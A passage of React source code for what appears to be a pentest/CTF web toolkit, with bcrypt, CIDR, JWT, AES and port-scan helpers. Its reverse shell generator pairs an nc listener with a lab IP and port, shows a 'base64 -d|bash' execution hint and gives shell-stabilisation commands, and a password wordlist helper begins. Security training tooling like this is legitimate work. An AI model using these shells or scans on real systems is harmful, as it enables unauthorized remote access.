    setInfo({ valid: true, msg: `Valid bcrypt • variant 2${m[1]} • cost ${cost} (2^${cost} iterations) • 22-char salt + 31-char hash`, cost, variant: `2${m[1]}` })
  }, [candidate])
  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><Fingerprint className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div>
            <CardTitle className="flex items-center gap-2">bcrypt <Badge variant="outline" className="text-[10px]">identifier & helper</Badge></CardTitle>
            <CardDescription>Validate format and generate reference commands. Hashing requires a server-side library.</CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div>
          <div className="text-[11px] font-medium tracking-wide text-[var(--text-2)] mb-1.5 uppercase">Hash to inspect</div>
          <textarea value={candidate} onChange={(e) => setCandidate(e.target.value)} placeholder="$2b$12$..." className={textareaClass + " font-mono text-[12.5px] min-h-[72px]"} spellCheck={false} />
        </div>
        {info && (
          <div className={`rounded-[8px] border px-3 py-2.5 flex gap-2 text-[12.5px] leading-relaxed ${info.valid ? "bg-emerald-50 border-emerald-200 text-emerald-800 dark:bg-emerald-950/20 dark:border-emerald-900 dark:text-emerald-300" : "bg-amber-50 border-amber-200 text-amber-800 dark:bg-amber-950/20 dark:border-amber-900 dark:text-amber-300"}`}>
            {info.valid ? <Check className="w-4 h-4 shrink-0 mt-[1px]" /> : <AlertCircle className="w-4 h-4 shrink-0 mt-[1px]" />}
            <span>{info.msg}</span>
          </div>
        )}
        <div className="grid gap-2">
          <div className="rounded-[8px] border border-[var(--border)] bg-[var(--surface-2)] p-3">
            <div className="text-[11px] font-semibold tracking-wide uppercase text-[var(--text-3)] mb-1.5">Generate (reference) — run locally / server</div>
            <div className="space-y-1.5 font-mono text-[11.5px] leading-relaxed break-all">
              <div className="flex items-center justify-between gap-2 bg-[var(--surface)] border border-[var(--border)] rounded-[7px] px-2.5 py-1.5">
                <span>htpasswd -nbB user &quot;password&quot;</span><CopyButton text='htpasswd -nbB user "password"' compact />
              </div>
              <div className="flex items-center justify-between gap-2 bg-[var(--surface)] border border-[var(--border)] rounded-[7px] px-2.5 py-1.5">
                <span>python3 -c &quot;import bcrypt; print(bcrypt.hashpw(b&apos;password&apos;, bcrypt.gensalt(12)).decode())&quot;</span><CopyButton text={'python3 -c "import bcrypt; print(bcrypt.hashpw(b\'password\', bcrypt.gensalt(12)).decode())"'} compact />
              </div>
              <div className="flex items-center justify-between gap-2 bg-[var(--surface)] border border-[var(--border)] rounded-[7px] px-2.5 py-1.5">
                <span>node -e &quot;import(&apos;bcryptjs&apos;).then(m=&gt; m.hash(&apos;password&apos;,12).then(console.log))&quot;</span><CopyButton text={'node -e "import(\'bcryptjs\').then(m=> m.hash(\'password\',12).then(console.log))"'} compact />
              </div>
            </div>
          </div>
          <div className="text-[11.5px] text-[var(--text-3)] leading-relaxed">Client-side bcrypt is intentionally not implemented — cost factors are designed for server computation. Use the commands above or your app&apos;s auth library. This tool only identifies and parses.</div>
        </div>
      </CardContent>
    </Card>
  )
}

function PayloadTool({ title, payloads, icon: Icon }: { title: string; payloads: { label: string; payload: string; ctx: string }[]; icon: React.ComponentType<{ className?: string }> }) {
  const [q, setQ] = React.useState("")
  const filtered = payloads.filter((p) => !q || p.label.toLowerCase().includes(q.toLowerCase()) || p.payload.toLowerCase().includes(q.toLowerCase()) || p.ctx.toLowerCase().includes(q.toLowerCase()))
  return (
    <Card className="flex flex-col">
      <CardHeader className="pb-3">
        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><Icon className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div className="flex-1">
            <CardTitle className="flex items-center gap-2">{title} <Badge variant="secondary" className="text-[10px]">{payloads.length} payloads</Badge></CardTitle>
            <CardDescription>Curated, minimal. Use only in authorized labs.</CardDescription>
          </div>
        </div>
        <div className="relative mt-3">
          <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-[var(--text-3)]" />
          <Input value={q} onChange={(e) => setQ(e.target.value)} placeholder={`Filter ${title.toLowerCase()}...`} className="pl-8 h-8 text-[13px]" />
          {q && <button onClick={() => setQ("")} className="absolute right-2 top-1/2 -translate-y-1/2 text-[11px] text-[var(--text-2)] hover:text-[var(--text)]">Clear</button>}
        </div>
      </CardHeader>
      <CardContent className="space-y-2 flex-1">
        {filtered.length === 0 ? (
          <Card className="border-dashed rounded-[12px] bg-[var(--surface-2)]">
            <CardContent className="p-6 text-center">
              <div className="w-10 h-10 rounded-full bg-[var(--surface)] border border-[var(--border)] flex items-center justify-center mx-auto">
                <Search className="w-5 h-5 text-[var(--text-2)]" />
              </div>
              <div className="mt-3 text-[14px] font-[600] tracking-[-0.01em]">No payloads match</div>
              <div className="mt-1 text-[12px] leading-5 text-[var(--text-2)] max-w-[260px] mx-auto">Try a broader search or clear filters to see all payloads.</div>
              <Button size="sm" onClick={() => setQ("")} className="mt-4 h-8 rounded-[8px] bg-[var(--text)] text-[var(--background)]">Clear search</Button>
            </CardContent>
          </Card>
        ) : (
          <div className="space-y-1.5 max-h-[420px] overflow-auto pr-1">
            {filtered.map((p, idx) => (
              <div key={idx} className="group flex items-start gap-2 rounded-[8px] border border-[var(--border)] bg-[var(--surface-2)] hover:bg-[var(--surface)] px-3 py-2 transition-colors">
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-1.5 flex-wrap">
                    <span className="text-[12px] font-[550]">{p.label}</span>
                    <Badge variant="outline" className="text-[10px] px-1.5 py-0 font-mono">{p.ctx}</Badge>
                  </div>
                  <div className="mt-1 font-mono text-[11.5px] leading-relaxed break-all text-[var(--text-2)] group-hover:text-[var(--text)]">{p.payload}</div>
                </div>
                <CopyButton text={p.payload} compact />
              </div>
            ))}
          </div>
        )}
        <div className="pt-2 flex items-center gap-1.5 text-[11px] text-[var(--text-3)]"><Shield className="w-3 h-3" /> For authorized testing only. Do not use against systems you don&apos;t own.</div>
      </CardContent>
    </Card>
  )
}

function CidrTool() {
  const [input, setInput] = React.useState("10.0.0.0/22")
  const [data, setData] = React.useState<ReturnType<typeof cidrInfo> | null>(null)
  const [err, setErr] = React.useState<string | null>(null)
  React.useEffect(() => {
    try { setErr(null); setData(cidrInfo(input)) } catch (e: unknown) { setErr(e instanceof Error ? e.message : "Invalid"); setData(null) }
  }, [input])
  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><Network className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div>
            <CardTitle>CIDR calculator</CardTitle>
            <CardDescription>Network, broadcast, range, mask. Pure client-side.</CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div className="flex gap-2">
          <Input value={input} onChange={(e) => setInput(e.target.value)} placeholder="192.168.1.0/24" className="font-mono text-[13px]" />
          <Button variant="secondary" size="sm" onClick={() => setInput("192.168.1.0/24")} className="shrink-0">Example</Button>
        </div>
        {err ? (
          <div className="rounded-[8px] border border-red-200 bg-red-50 text-red-700 dark:bg-red-950/20 dark:border-red-900 dark:text-red-300 px-3 py-2.5 text-[12.5px] flex gap-2"><AlertCircle className="w-4 h-4 shrink-0 mt-[1px]" />{err}</div>
        ) : data ? (
          <div className="space-y-3">
            <div className="grid grid-cols-2 gap-2">
              {[
                { k: "Network", v: data.network },
                { k: "Broadcast", v: data.broadcast },
                { k: "Netmask", v: data.netmask },
                { k: "Wildcard", v: data.wildcard },
                { k: "First host", v: data.first },
                { k: "Last host", v: data.last },
              ].map((r) => (
                <div key={r.k} className="rounded-[8px] border border-[var(--border)] bg-[var(--surface)] px-3 py-2 flex items-center justify-between gap-2">
                  <div><div className="text-[10px] font-semibold tracking-widest uppercase text-[var(--text-3)]">{r.k}</div><div className="font-mono text-[13px] font-[550]">{r.v}</div></div>
                  <CopyButton text={r.v} compact />
                </div>
              ))}
            </div>
            <div className="grid grid-cols-3 gap-2">
              <div className="rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] p-2.5 text-center">
                <div className="text-[11px] tracking-wide uppercase text-[var(--text-3)] font-semibold">Prefix</div>
                <div className="font-mono text-[14px] font-[700]">/{data.prefix}</div>
              </div>
              <div className="rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] p-2.5 text-center">
                <div className="text-[11px] tracking-wide uppercase text-[var(--text-3)] font-semibold">Total IPs</div>
                <div className="font-mono text-[14px] font-[700]">{data.total.toLocaleString()}</div>
              </div>
              <div className="rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] p-2.5 text-center">
                <div className="text-[11px] tracking-wide uppercase text-[var(--text-3)] font-semibold">Usable hosts</div>
                <div className="font-mono text-[14px] font-[700]">{data.usable.toLocaleString()}</div>
              </div>
            </div>
            <div className="flex flex-wrap gap-1.5">
              <Badge variant="outline" className="font-mono text-[11px]">/{data.prefix} = {data.netmask}</Badge>
              <Badge variant="secondary" className="text-[11px]">Range: {data.first} – {data.last}</Badge>
            </div>
          </div>
        ) : null}
      </CardContent>
    </Card>
  )
}

function PortScanHelper() {
  const [host, setHost] = React.useState("10.10.11.5")
  const [ports, setPorts] = React.useState("22,80,443,8000-8100")
  const [udp, setUdp] = React.useState(false)
  const [fast, setFast] = React.useState(true)
  const nmap = `nmap -s${udp ? "U" : "S"}${fast ? "" : " -sV -sC"} -p ${ports || "1-65535"} ${udp ? "-F " : ""}${host} -oN scan.nmap`
  const nmapTop = `nmap --top-ports 1000 -sV ${host}`
  const rust = `rustscan -a ${host} ${ports ? `-- -p ${ports}` : ""}`
  const mass = `masscan ${host} -p${ports || "1-65535"} --rate 1000 -oG masscan.grep`
  const cmds = [
    { label: "nmap (custom ports)", cmd: nmap },
    { label: "nmap (top 1000 + version)", cmd: nmapTop },
    { label: "rustscan", cmd: rust },
    { label: "masscan (fast)", cmd: mass },
  ]
  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><ScanSearch className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div>
            <CardTitle>Port scan helper</CardTitle>
            <CardDescription>Generate safe nmap/rustscan commands. Review before executing.</CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div className="grid sm:grid-cols-2 gap-3">
          <div>
            <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1.5">Target</div>
            <Input value={host} onChange={(e) => setHost(e.target.value)} placeholder="10.10.11.5 or scanme.nmap.org" className="font-mono text-[13px]" />
          </div>
          <div>
            <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1.5">Ports</div>
            <Input value={ports} onChange={(e) => setPorts(e.target.value)} placeholder="1-65535 or 22,80,443" className="font-mono text-[13px]" />
          </div>
        </div>
        <div className="flex flex-wrap gap-3 text-[12.5px]">
          <label className="flex items-center gap-1.5"><input type="checkbox" checked={udp} onChange={(e) => setUdp(e.target.checked)} className="rounded" /> UDP</label>
          <label className="flex items-center gap-1.5"><input type="checkbox" checked={fast} onChange={(e) => setFast(e.target.checked)} className="rounded" /> Fast (no version scan)</label>
          <span className="text-[11px] text-[var(--text-3)] ml-auto">Output saved to scan.nmap / grep</span>
        </div>
        <div className="space-y-1.5">
          {cmds.map((c) => (
            <div key={c.label} className="rounded-[8px] border border-[var(--border)] bg-[#0F1012] dark:bg-[#0A0A0B] px-3 py-2.5 flex items-start gap-2">
              <div className="flex-1 min-w-0">
                <div className="text-[11px] font-medium text-zinc-400 tracking-wide uppercase">{c.label}</div>
                <div className="font-mono text-[12.5px] text-zinc-100 break-all leading-relaxed">{c.cmd}</div>
              </div>
              <CopyButton text={c.cmd} compact />
            </div>
          ))}
        </div>
        <div className="rounded-[8px] bg-amber-50 dark:bg-amber-950/20 border border-amber-200 dark:border-amber-900 px-3 py-2 text-[11.5px] text-amber-800 dark:text-amber-300 flex gap-2">
          <AlertCircle className="w-3.5 h-3.5 mt-[2px] shrink-0" /> Only scan systems you have permission to test. Combine with -Pn if host blocks ping, and rate-limit on shared networks.
        </div>
      </CardContent>
    </Card>
  )
}

function JwtTool() {
  const [input, setInput] = React.useState("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsZXgiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")
  const [header, setHeader] = React.useState<string>("")
  const [payload, setPayload] = React.useState<string>("")
  const [sig, setSig] = React.useState<string>("")
  const [err, setErr] = React.useState<string | null>(null)
  const [isExpired, setIsExpired] = React.useState<boolean | null>(null)
  React.useEffect(() => {
    try {
      setErr(null); setIsExpired(null)
      const t = input.trim()
      if (!t) { setHeader(""); setPayload(""); setSig(""); return }
      const parts = t.split(".")
      if (parts.length !== 3) throw new Error("JWT must have 3 dot-separated parts (header.payload.signature)")
      const h = b64UrlDecode(parts[0])
      const p = b64UrlDecode(parts[1])
      // validate json
      const hj = JSON.stringify(JSON.parse(h), null, 2)
      const pj = JSON.stringify(JSON.parse(p), null, 2)
      setHeader(hj); setPayload(pj); setSig(parts[2])
      try {
        const parsed = JSON.parse(p)
        if (parsed.exp) {
          const now = Math.floor(Date.now() / 1000)
          setIsExpired(parsed.exp < now)
        }
      } catch { /* ignore */ }
    } catch (e: unknown) { setErr(e instanceof Error ? e.message : "Decode failed"); setHeader(""); setPayload(""); setSig("") }
  }, [input])
  const pretty = (s: string) => { try { return JSON.stringify(JSON.parse(s), null, 2) } catch { return s } }
  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><KeyRound className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div className="flex-1">
            <CardTitle className="flex items-center gap-2">JWT decode <Badge variant="secondary" className="text-[10px]">no verification</Badge></CardTitle>
            <CardDescription>Base64url decode header & payload. Signature is not verified — always verify server-side.</CardDescription>
          </div>
          {isExpired !== null && <Badge variant={isExpired ? "warning" : "success"} className="shrink-0">{isExpired ? "Expired" : "Live"}</Badge>}
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div>
          <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1.5">JWT</div>
          <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="eyJhbGciOi..." className={textareaClass + " font-mono text-[12px] min-h-[72px]"} spellCheck={false} />
          <div className="flex items-center justify-between mt-1">
            <span className="text-[11px] font-mono text-[var(--text-3)]">{input.split(".").length} parts</span>
            <button onClick={() => setInput("")} className="text-[11px] text-[var(--text-2)] hover:text-[var(--text)]">Clear</button>
          </div>
        </div>
        {err ? (
          <div className="rounded-[8px] border border-red-200 bg-red-50 text-red-700 dark:bg-red-950/20 dark:border-red-900 dark:text-red-300 px-3 py-2.5 text-[12.5px] flex gap-2"><AlertCircle className="w-4 h-4 shrink-0 mt-[1px]" />{err}</div>
        ) : (
          <div className="grid lg:grid-cols-2 gap-3">
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <span className="text-[11px] font-semibold tracking-widest uppercase text-[var(--text-3)]">Header</span>
                <CopyButton text={header} compact />
              </div>
              <pre className={outputAreaClass + " text-[11.5px]"}>{header ? pretty(header) : <span className="text-[var(--text-3)]">—</span>}</pre>
              {header && (() => { try { const h = JSON.parse(header); return <div className="mt-1 flex gap-1.5 flex-wrap"><Badge variant="outline" className="text-[11px] font-mono">alg: {h.alg || "?"}</Badge><Badge variant="outline" className="text-[11px] font-mono">typ: {h.typ || "?"}</Badge></div> } catch { return null } })()}
            </div>
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <span className="text-[11px] font-semibold tracking-widest uppercase text-[var(--text-3)]">Payload</span>
                <CopyButton text={payload} compact />
              </div>
              <pre className={outputAreaClass + " text-[11.5px]"}>{payload ? pretty(payload) : <span className="text-[var(--text-3)]">—</span>}</pre>
            </div>
            <div className="lg:col-span-2">
              <div className="flex items-center justify-between mb-1.5">
                <span className="text-[11px] font-semibold tracking-widest uppercase text-[var(--text-3)]">Signature (base64url, not verified)</span>
                <CopyButton text={sig} compact />
              </div>
              <div className="rounded-[8px] border border-[var(--border)] bg-[var(--surface-2)] px-3 py-2 font-mono text-[11.5px] break-all text-[var(--text-2)]">{sig || "—"}</div>
              <div className="mt-2 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] px-3 py-2 text-[11.5px] text-[var(--text-2)] flex gap-2">
                <Lock className="w-3.5 h-3.5 mt-[2px] shrink-0 text-[var(--text-3)]" />
                <span>To verify, use your backend&apos;s JWT library with the correct secret / public key. Try <span className="font-mono bg-[var(--surface)] border border-[var(--border)] px-1 py-0.5 rounded">jwt.io</span> or <span className="font-mono bg-[var(--surface)] border border-[var(--border)] px-1 py-0.5 rounded">node -e &quot;require(&apos;jsonwebtoken&apos;).verify(token, secret)&quot;</span>.</span>
              </div>
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  )
}

function AesTool() {
  const [mode, setMode] = React.useState<"encrypt" | "decrypt">("encrypt")
  const [pass, setPass] = React.useState("correct-horse-battery")
  const [showPass, setShowPass] = React.useState(false)
  const [plaintext, setPlaintext] = React.useState("flag{aegis_aes_sample}")
  const [cipherInput, setCipherInput] = React.useState("")
  const [out, setOut] = React.useState("")
  const [err, setErr] = React.useState<string | null>(null)
  const [busy, setBusy] = React.useState(false)

  const deriveKey = async (passphrase: string, salt: Uint8Array) => {
    const enc = new TextEncoder()
    const km = await crypto.subtle.importKey("raw", enc.encode(passphrase), "PBKDF2", false, ["deriveKey"])
    return crypto.subtle.deriveKey({ name: "PBKDF2", salt: salt as BufferSource, iterations: 100_000, hash: "SHA-256" }, km, { name: "AES-GCM", length: 256 }, false, ["encrypt", "decrypt"])
  }

  const handleEncrypt = async () => {
    try {
      setErr(null); setBusy(true)
      if (!pass) throw new Error("Passphrase required")
      if (!plaintext) throw new Error("Plaintext required")
      const salt = crypto.getRandomValues(new Uint8Array(16))
      const iv = crypto.getRandomValues(new Uint8Array(12))
      const key = await deriveKey(pass, salt)
      const ct = await crypto.subtle.encrypt({ name: "AES-GCM", iv: iv as BufferSource }, key, new TextEncoder().encode(plaintext))
      const combined = new Uint8Array(salt.length + iv.length + ct.byteLength)
      combined.set(salt, 0); combined.set(iv, salt.length); combined.set(new Uint8Array(ct), salt.length + iv.length)
      let bin = ""; combined.forEach((b) => bin += String.fromCharCode(b))
      const b64 = btoa(bin)
      setOut(b64)
      setCipherInput(b64)
    } catch (e: unknown) { setErr(e instanceof Error ? e.message : "Encrypt failed") }
    finally { setBusy(false) }
  }
  const handleDecrypt = async () => {
    try {
      setErr(null); setBusy(true)
      if (!pass) throw new Error("Passphrase required")
      const src = cipherInput.trim()
      if (!src) throw new Error("Ciphertext (base64) required")
      const bin = atob(src)
      const bytes = Uint8Array.from(bin, (c) => c.charCodeAt(0))
      if (bytes.length < 28) throw new Error("Ciphertext too short — expected salt(16)+iv(12)+ct")
      const salt = bytes.slice(0, 16); const iv = bytes.slice(16, 28); const ct = bytes.slice(28)
      const key = await deriveKey(pass, salt)
      const pt = await crypto.subtle.decrypt({ name: "AES-GCM", iv: iv as BufferSource }, key, ct as BufferSource)
      setOut(new TextDecoder().decode(pt))
    } catch (e: unknown) { setErr(e instanceof Error ? e.message : "Decrypt failed — wrong passphrase or corrupted data") }
    finally { setBusy(false) }
  }
  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><Lock className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div className="flex-1">
            <CardTitle className="flex items-center gap-2">AES-256-GCM <Badge variant="outline" className="text-[10px]">PBKDF2 · 100k</Badge></CardTitle>
            <CardDescription>Encrypt/decrypt locally. Output is base64 of salt(16)‖iv(12)‖ciphertext+tag. No data leaves your browser.</CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div className="flex gap-1 p-1 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] w-fit">
          <button onClick={() => setMode("encrypt")} className={`px-3 py-1 rounded-[6px] text-[12.5px] font-[500] ${mode === "encrypt" ? "bg-[var(--surface)] border border-[var(--border)] shadow-sm" : "text-[var(--text-2)]"}`}>Encrypt</button>
          <button onClick={() => setMode("decrypt")} className={`px-3 py-1 rounded-[6px] text-[12.5px] font-[500] ${mode === "decrypt" ? "bg-[var(--surface)] border border-[var(--border)] shadow-sm" : "text-[var(--text-2)]"}`}>Decrypt</button>
        </div>
        <div>
          <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1.5">Passphrase</div>
          <div className="relative">
            <Input value={pass} onChange={(e) => setPass(e.target.value)} type={showPass ? "text" : "password"} placeholder="Strong passphrase..." className="pr-16 font-mono text-[13px]" />
            <button onClick={() => setShowPass((v) => !v)} className="absolute right-2 top-1/2 -translate-y-1/2 p-1.5 rounded hover:bg-[var(--surface-2)] text-[var(--text-3)] hover:text-[var(--text)]">
              {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>
        </div>
        {mode === "encrypt" ? (
          <div>
            <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1.5">Plaintext</div>
            <textarea value={plaintext} onChange={(e) => setPlaintext(e.target.value)} placeholder="Secret to encrypt..." className={textareaClass} spellCheck={false} />
            <Button onClick={handleEncrypt} disabled={busy} className="mt-2 w-full rounded-[8px] gap-2">
              {busy ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Lock className="w-3.5 h-3.5" />} Encrypt
            </Button>
          </div>
        ) : (
          <div>
            <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1.5">Ciphertext (base64)</div>
            <textarea value={cipherInput} onChange={(e) => setCipherInput(e.target.value)} placeholder="Paste base64 from encrypt..." className={textareaClass + " font-mono text-[12px]"} spellCheck={false} />
            <Button onClick={handleDecrypt} disabled={busy} className="mt-2 w-full rounded-[8px] gap-2">
              {busy ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <KeyRound className="w-3.5 h-3.5" />} Decrypt
            </Button>
          </div>
        )}
        <div>
          <div className="flex items-center justify-between mb-1.5">
            <span className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)]">Result</span>
            <CopyButton text={out} />
          </div>
          <div className={outputAreaClass}>
            {err ? <span className="text-red-700 dark:text-red-300 flex gap-1.5"><AlertCircle className="w-3.5 h-3.5 mt-[1px]" />{err}</span> : out || <span className="text-[var(--text-3)]">{mode === "encrypt" ? "Ciphertext will appear here…" : "Plaintext will appear here…"}</span>}
          </div>
          {mode === "encrypt" && out && <div className="mt-1 text-[11px] font-mono text-[var(--text-3)]">{out.length} chars (base64) — includes random salt & IV, so same plaintext encrypts differently each time.</div>}
        </div>
      </CardContent>
    </Card>
  )
}

function ReverseShellTool() {
  const [ip, setIp] = React.useState("10.10.14.23")
  const [port, setPort] = React.useState("4444")
  const [selected, setSelected] = React.useState<keyof typeof shellTemplates>("bash")
  const [listener, setListener] = React.useState("nc -lvnp 4444")
  React.useEffect(() => { setListener(`nc -lvnp ${port || "4444"}`) }, [port])
  const validateIp = (v: string) => /^(?:\d{1,3}\.){3}\d{1,3}$/.test(v) || /^[a-zA-Z0-9.-]+$/.test(v)
  const portNum = Number(port)
  const portValid = Number.isInteger(portNum) && portNum > 0 && portNum <= 65535
  const activePayload = (() => {
    const fn = shellTemplates[selected]
    if (!fn) return ""
    try { return fn(ip || "10.10.14.23", port || "4444") } catch { return "" }
  })()
  // encode variants
  const b64 = (() => { try { return b64Encode(activePayload) } catch { return "" } })()
  const urlEnc = (() => { try { return encodeURIComponent(activePayload) } catch { return "" } })()

  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><Terminal className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div className="flex-1">
            <CardTitle className="flex items-center gap-2">Reverse shell generator <Badge variant="secondary" className="text-[10px]">{Object.keys(shellTemplates).length} variants</Badge></CardTitle>
            <CardDescription>Listener + payloads. Replace IP/port for your lab.</CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div className="grid sm:grid-cols-[1fr_120px_1fr] gap-3">
          <div>
            <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1.5">LHOST</div>
            <Input value={ip} onChange={(e) => setIp(e.target.value)} placeholder="10.10.14.23" className="font-mono text-[13px]" />
            {!validateIp(ip) && ip && <div className="text-[11px] text-amber-600 mt-1">Check hostname/IP</div>}
          </div>
          <div>
            <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1.5">LPORT</div>
            <Input value={port} onChange={(e) => setPort(e.target.value)} placeholder="4444" className={`font-mono text-[13px] ${!portValid && port ? "border-red-300 focus-visible:ring-red-400" : ""}`} />
            {!portValid && port && <div className="text-[11px] text-red-600 mt-1">1–65535</div>}
          </div>
          <div>
            <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-2)] mb-1.5">Listener</div>
            <div className="flex gap-1.5">
              <div className="flex-1 rounded-[8px] border border-[var(--border)] bg-[#0F1012] text-zinc-100 font-mono text-[12px] px-2.5 py-2 truncate">{listener}</div>
              <CopyButton text={listener} compact />
            </div>
          </div>
        </div>

        <div className="flex gap-1.5 flex-wrap">
          {Object.keys(shellTemplates).map((k) => (
            <button key={k} onClick={() => setSelected(k as keyof typeof shellTemplates)} className={`px-2.5 py-1 rounded-full text-[12px] font-[500] border transition-colors ${selected === k ? "bg-[var(--text)] text-[var(--background)] border-[var(--text)]" : "bg-[var(--surface)] text-[var(--text-2)] border-[var(--border)] hover:bg-[var(--surface-2)]"}`}>{k}</button>
          ))}
        </div>

        <div className="space-y-2">
          <div className="flex items-center justify-between">
            <span className="text-[11px] font-semibold tracking-widest uppercase text-[var(--text-3)]">{selected} payload</span>
            <CopyButton text={activePayload} />
          </div>
          <div className="rounded-[8px] border border-[var(--border)] bg-[#0F1012] p-3 font-mono text-[12.5px] leading-relaxed break-all text-zinc-100 flex gap-2">
            <span className="flex-1 break-all">{activePayload}</span>
            <CopyButton text={activePayload} compact />
          </div>
          <div className="grid sm:grid-cols-2 gap-2">
            <div className="rounded-[8px] border border-[var(--border)] bg-[var(--surface-2)] p-2.5">
              <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-3)] mb-1 flex items-center justify-between">Base64 <CopyButton text={b64} compact /></div>
              <div className="font-mono text-[11px] break-all leading-relaxed max-h-[72px] overflow-auto">{b64 || "—"}</div>
              <div className="mt-1 text-[11px] font-mono text-[var(--text-3)] flex gap-1 items-center">Use: <span className="bg-[var(--surface)] border border-[var(--border)] rounded px-1">echo {b64.slice(0, 16)}...|base64 -d|bash</span></div>
            </div>
            <div className="rounded-[8px] border border-[var(--border)] bg-[var(--surface-2)] p-2.5">
              <div className="text-[11px] font-medium tracking-wide uppercase text-[var(--text-3)] mb-1 flex items-center justify-between">URL-encoded <CopyButton text={urlEnc} compact /></div>
              <div className="font-mono text-[11px] break-all leading-relaxed max-h-[72px] overflow-auto">{urlEnc || "—"}</div>
            </div>
          </div>
        </div>

        <div className="rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] p-2.5 text-[11.5px] leading-relaxed text-[var(--text-2)] flex gap-2">
          <Info className="w-3.5 h-3.5 mt-[2px] shrink-0" />
          <span>Stabilize: <span className="font-mono bg-[var(--surface)] border border-[var(--border)] px-1 py-0.5 rounded">python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span> then <span className="font-mono bg-[var(--surface)] border border-[var(--border)] px-1 py-0.5 rounded">export TERM=xterm; stty raw -echo; fg</span>. Use only on systems you own.</span>
        </div>
      </CardContent>
    </Card>
  )
}

function WordlistHelper() {
  const [input, setInput] = React.useState("Admin\nadmin\nADMIN\nroot\nuser\ntest\ntest\npassword123\nletmein\n")
  const [prefix, setPrefix] = React.useState("")
  const [suffix, setSuffix] = React.useState("")
  const [dedup, setDedup] = React.useState(true)
  const [lower, setLower] = React.useState(false)
  const [upper, setUpper] = React.useState(false)
  const [minLen, setMinLen] = React.useState("")
  const [filter, setFilter] = React.useState("")
  const lines = React.useMemo(() => {
    let arr = input.split(/\r?\n/)
    // keep empty tracking but filter later for display
    if (filter) {
      try {
        const re = new RegExp(filter)
        arr = arr.filter((l) => re.test(l))
      } catch { /* invalid regex ignore */ }
    }
    if (lower) arr = arr.map((l) => l.toLowerCase())
    if (upper) arr = arr.map((l) => l.toUpperCase())
    if (prefix || suffix) arr = arr.map((l) => `${prefix}${l}${suffix}`)
    if (minLen) {
      const n = Number(minLen)
      if (!Number.isNaN(n)) arr = arr.filter((l) => l.length >= n)
    }
    if (dedup) {
      const seen = new Set<string>()
      arr = arr.filter((l) => {
        if (seen.has(l)) return false
        seen.add(l)
        return true
      })
    }
    return arr
  }, [input, prefix, suffix, dedup, lower, upper, minLen, filter])
  const out = lines.join("\n")
  const stats = `${lines.filter((l) => l.trim()).length} lines • ${out.length} chars • ${dedup ? "deduped" : "with dupes"}`
  return (
    <Card>
      <CardHeader className="pb-3">
